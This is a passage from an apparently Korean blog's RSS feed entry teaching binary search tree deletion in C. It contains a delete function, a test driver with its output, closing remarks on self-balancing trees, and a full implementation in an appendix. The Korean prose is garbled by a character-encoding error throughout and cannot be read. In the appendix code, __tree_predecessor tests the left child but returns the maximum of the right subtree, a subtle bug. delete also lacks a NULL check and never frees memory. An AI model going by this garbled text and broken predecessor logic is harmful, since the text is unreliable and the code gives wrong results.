u-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ì œ <code>__transplant</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì‚­ì œ í•¨ìˆ˜ë¥¼ í¸í•˜ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚­ì œ ì—°ì‚°ì„ ìœ„í•œ <code>delete</code> í•¨ìˆ˜ëŠ” í‚¤ <code>key</code> ë¥¼ ë°›ì•„, ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‚­ì œí•  ë…¸ë“œ <code>x</code> ë¥¼ ì°¾ê³  ì‚­ì œí•©ë‹ˆë‹¤. 4í–‰ê³¼ 6í–‰ì€ ì‚­ì œí•  ë…¸ë“œ <code>x</code> ì˜ ìì‹ì´ ì—†ê±°ë‚˜ í•˜ë‚˜ì¸ ê²½ìš°ë¡œ, <code>__transplant</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ìì‹ ë˜ëŠ” <code>NULL</code> ì„ <code>x</code> ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤.</p><p>9í–‰ì€ <code>x</code> ì˜ ìì‹ì´ ë‘˜ì¸ ê²½ìš°ì…ë‹ˆë‹¤. ì´ ê²½ìš°ëŠ” ë¨¼ì € <code>x</code> ì˜ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ë‹¤ìŒ ë…¸ë“œ <code>y</code> ë¥¼ ì°¾ìŠµë‹ˆë‹¤. 11í–‰ì€ <code>y</code> ê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì•„ë‹Œ ê²½ìš°ë¡œ, ìœ„ì˜ ê·¸ë¦¼ê³¼ ê°™ì´ <code>y</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <code>y</code> ìœ„ì¹˜ì— ëŒ€ì…ì‹œì¼œ ë†“ìŠµë‹ˆë‹¤. ì´í›„ <code>y</code> ê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ (ê·¸ë¦¼ì—ì„œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>)ì˜ ë¶€ëª¨ê°€ ë˜ë„ë¡ ì—°ê²°í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ 16í–‰ì—ì„œ, ë‹¤ìŒ ë…¸ë“œê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì¸ ê²½ìš°ì™€ ë˜‘ê°™ì´ <code>y</code> ë¥¼ <code>x</code> ìœ„ì¹˜ì— ëŒ€ì…ë§Œ í•´ì£¼ë©´ ë©ë‹ˆë‹¤. ëŒ€ì… í›„ <code>y</code> ì˜ ìì‹ì— ëŒ€í•œ í¬ì¸í„° ì—°ê²°ì€ ì§ì ‘ í•´ì•¼ í•¨ì— ìœ ì˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;right);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y = __tree_min(x-&gt;right);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">__transplant(bst, y, y-&gt;right);</span><br><span class="line">y-&gt;right = x-&gt;right;</span><br><span class="line">y-&gt;right-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">__transplant(bst, x, y);</span><br><span class="line">y-&gt;left = x-&gt;left;</span><br><span class="line">y-&gt;left-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ ì‚¬ìš©í•´ë³´ê¸°</h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ëª¨ë“  ì—°ì‚°ì„ êµ¬í˜„í–ˆìœ¼ë‹ˆ, ì§ì ‘ ì‚¬ìš©í•´ ë´…ì‹œë‹¤. ì•„ë˜ëŠ” <code>BST</code> êµ¬ì¡°ì²´ë¥¼ ì‚¬ìš©í•˜ëŠ” í…ŒìŠ¤íŠ¸ ì½”ë“œì…ë‹ˆë‹¤. 5í–‰ì€ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— 1ë¶€í„° 10ê¹Œì§€ì˜ í‚¤ë¥¼ ë’¤ì£½ë°•ì£½ ì‚½ì…í•˜ê³  ì¶œë ¥í•©ë‹ˆë‹¤. ì‚½ì…ì€ ê·¸ë ‡ê²Œ í•´ë„ ì¶œë ¥ì€ ì‘ì€ ìˆœì„œëŒ€ë¡œ ì˜ ë‚˜ì™€ì¤ë‹ˆë‹¤. 10í–‰ì€ í‚¤ 1~3ì„ ì‚­ì œí•˜ê³ , 11~13ì„ ìƒˆë¡œ ì§‘ì–´ë„£ì€ í›„ ë˜ ì¶œë ¥í•©ë‹ˆë‹¤. ì´ë²ˆì—ë„ 4ë¶€í„° 13ê¹Œì§€ ì‘ì€ ìˆœì„œëŒ€ë¡œ ì˜ ì¶œë ¥ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ./main </span><br><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">3 3</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">11 11</span><br><span class="line">12 12</span><br><span class="line">13 13</span><br></pre></td></tr></table></figure><h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">ê²°ë¡ </h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” í‚¤-ê°’ ë°ì´í„°ë¥¼ ì •ë ¬ëœ ìˆœì„œë¡œ ê´€ë¦¬í•  ìˆ˜ ìˆê³ , ì‚½ì…ê³¼ ì‚­ì œ ë“±ì˜ ëª¨ë“  ì—°ì‚°ì„ ì´ìƒì ìœ¼ë¡œëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ì— ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ìµœì•…ì˜ ê²½ìš° <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ê¹Œì§€ ê±¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” ì„ í˜• ìë£Œêµ¬ì¡°ì— ë¹„í•´ ë³„ë¡œ ì¢‹ì€ ì ì´ ì—†ìŠµë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ ì§‘í•©ì´ë‚˜ ë”•ì…”ë„ˆë¦¬ ë“± ì»¨í…Œì´ë„ˆì˜ êµ¬í˜„ì—ëŠ” íŠ¸ë¦¬ì˜ í˜•íƒœë¥¼ íš¨ìœ¨ì ì¸ í˜•íƒœë¡œ ìœ ì§€í•˜ë„ë¡ í•˜ëŠ” ì•Œê³ ë¦¬ì¦˜ì´ ì¶”ê°€ëœ ìê°€ ê· í˜•(self-balancing) ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì‹¤ì œë¡œ ë¦¬ëˆ…ìŠ¤ì˜ <code>g++</code> ì»´íŒŒì¼ëŸ¬ê°€ ì‚¬ìš©í•˜ëŠ” C++ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë™ì  ë¶„ì„í•œ ê²°ê³¼, <code>std::set</code> ì˜ êµ¬í˜„ì— ìê°€ ê· í˜• ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì¼ì¢…ì¸ ë ˆë“œ-ë¸”ë™ íŠ¸ë¦¬(red-black tree)ë¥¼ ì‚¬ìš©í•˜ê³  ìˆì—ˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" target="_blank"><div class="link-preview-widget-title">What is the underlying data structure of a STL set in C++?</div><div class="link-preview-widget-description">I would like to know how a set is implemented in C++. If I were to implement my own set container without using the STL provided container, what would be the best way to go about this task?I unde...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] T.H. Corman, C.E. Leiserson, R.L. Rivest and C. Stein, â€œBinary Search Trees,â€ in <em>Introduction to Algorithms</em>, 3rd ed. Cambridge, MA: MIT Press, 2009, pp. 286-298.</p><h2 id="%EB%B6%80%EB%A1%9D" tabindex="-1">ë¶€ë¡</h2><h3 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84-%EC%BD%94%EB%93%9C" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ êµ¬í˜„ ì½”ë“œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Definitions */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line"><span class="type">int</span> key, value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">Node *root;</span><br><span class="line">&#125; BST;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Internal Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">__tree_walk(x-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">__tree_walk(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_max(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line"><span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">bst-&gt;root = v;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;</span><br><span class="line">u-&gt;parent-&gt;left = v;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">u-&gt;parent-&gt;right = v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">v-&gt;parent = u-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Exposed Functions */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">y = x;</span><br><span class="line">x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;<span class="comment">// bst is empty</span></span><br><span class="line">bst-&gt;root = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">y-&gt;left = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y-&gt;right = newnode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;right);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y = __tree_min(x-&gt;right);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">__transplant(bst, y, y-&gt;right);</span><br><span class="line">y-&gt;right = x-&gt;right;</span><br><span class="line">y-&gt;right-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">__transplant(bst, x, y);</span><br><span class="line">y-&gt;left = x-&gt;left;</span><br><span class="line">y-&gt;left-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Driver Code */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Computer-Science/">Computer Science</category>
      
      <category domain="https://juhyun167.github.io/categories/Computer-Science/Data-Structures/">Data Structures</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/06/08/binary-search-tree/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
